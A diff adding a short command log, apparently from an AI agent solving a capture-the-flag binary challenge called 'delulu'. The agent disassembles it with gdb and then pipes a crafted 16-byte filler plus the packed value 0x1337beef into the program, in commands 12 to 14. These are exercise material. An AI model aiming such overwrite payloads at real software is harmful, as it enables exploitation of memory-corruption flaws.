@@ -1,0 +1,42 @@
+### [1] bash
+ls -la /root/
+
+### [2] bash
+file /root/delulu && ls -la /root/glibc/
+
+### [3] bash
+/root/delulu
+
+### [4] bash
+chmod +x /root/delulu && /root/delulu
+
+### [5] bash
+echo "test" | /root/delulu
+
+### [6] bash
+cd /root && gdb -q ./delulu -ex "set confirm off" -ex "info functions" -ex "quit"
+
+### [7] bash
+apt-get update && apt-get install -y gdb
+
+### [8] bash
+cd /root && gdb -q ./delulu -ex "set confirm off" -ex "info functions" -ex "quit"
+
+### [9] bash
+cd /root && gdb -q ./delulu -ex "set confirm off" -ex "disassemble main" -ex "quit"
+
+### [10] bash
+cd /root && gdb -q ./delulu -ex "set confirm off" -ex "disassemble delulu" -ex "quit"
+
+### [11] bash
+cd /root && gdb -q ./delulu -ex "set confirm off" -ex "x/s 0x2033" -ex "x/s 0x2040" -ex "x/s 0x2080" -ex "x/s 0x25dc" -ex "x/s 0x25ed" -ex "quit"
+
+### [12] bash
+python3 -c "import sys; sys.stdout.buffer.write(b'A' * 16 + b'\xef\xbe\x37\x13\x00\x00\x00\x00')" | /root/delulu
+
+### [13] bash
+python3 -c "import struct; sys.stdout.buffer.write(b'A' * 16 + struct.pack('<Q', 0x1337beef))" | /root/delulu
+
+### [14] bash
+python3 -c "import sys, struct; sys.stdout.buffer.write(b'A' * 16 + struct.pack('<Q', 0x1337beef))" | /root/delulu
+
